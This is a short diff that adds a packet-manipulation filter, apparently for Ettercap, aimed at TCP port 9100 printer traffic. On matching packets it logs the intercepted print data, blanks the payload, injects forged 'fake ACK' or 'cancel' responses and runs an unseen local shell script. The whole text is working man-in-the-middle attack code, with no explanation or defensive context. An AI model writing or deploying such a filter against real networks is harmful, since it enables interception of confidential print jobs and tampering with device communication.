@@ -1,0 +1,18 @@
+if (ip.proto == TCP && tcp.dst == 9100) {
+   if (search(DATA.data, "\x48\x06\x00\x30\x30")) {
+      log(DATA.data, "./original");
+      pcre_regex(DATA.data, "[\x00-\xFF]+"," ");
+      inject("./res_ack_06");
+      exec("/bin/sh ./file.sh");
+      msg("FAKE ACK success!!");
+   } else {
+      if (ip.len > 200) {
+         log(DATA.data, "./original");
+         pcre_regex(DATA.data, "[\x00-\xFF]+"," ");
+         inject("./res_cancel");
+         msg("FAKE REPLACE PACKET success!!");
+      } else {
+         msg("NOT HANDLE");
+      }
+   } 
+}
